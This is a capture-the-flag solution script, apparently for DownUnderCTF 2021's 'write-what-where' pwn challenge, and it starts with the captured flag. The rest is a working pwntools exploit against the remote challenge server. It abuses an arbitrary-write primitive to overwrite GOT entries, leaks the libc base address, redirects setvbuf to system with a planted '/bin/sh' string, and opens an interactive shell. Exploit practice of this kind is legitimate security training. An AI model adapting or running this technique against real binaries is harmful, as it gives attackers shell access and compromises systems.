#DUCTF{arb1tr4ry_wr1t3_1s_str0ng_www}
from pwn import *

elf = ELF("./write-what-where")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.33.so")

#target = elf.process()
target = remote("pwn-2021.duc.tf", 31920)

def sa( d):
    target.sendafter("?", str(d))

def write(address, data):
    sa(data)
    sa(address)


write(elf.got['exit'], p32(0x004011d9))
write(elf.got['setvbuf'], p32(elf.plt['puts']))
write(elf.got['setvbuf'] + 4, p32(0))
write(0x404060, p32(0x404050))
write(0x404060 + 4, p32(0))
write(0x404080, "/bin")
write(0x404080 + 4, "/sh\x00")

write(elf.got['exit'], p32(elf.sym['main']))

target.recvline()
libc_base = u64(target.recvline().strip().ljust(8, '\x00')) - libc.sym['_IO_2_1_stdout_']
log.info("LIBC Base: " + hex(libc_base))

write(0x404060, p32(0x404080))
write(elf.got['exit'], p32(0x004011d9))
write(elf.got['setvbuf'], p32((libc_base + libc.sym['system']) & 0xffffffff))
write(elf.got['setvbuf'] + 4, p32((libc_base + libc.sym['system']) >> 32))

write(elf.got['exit'], p32(0x00401166))

target.interactive()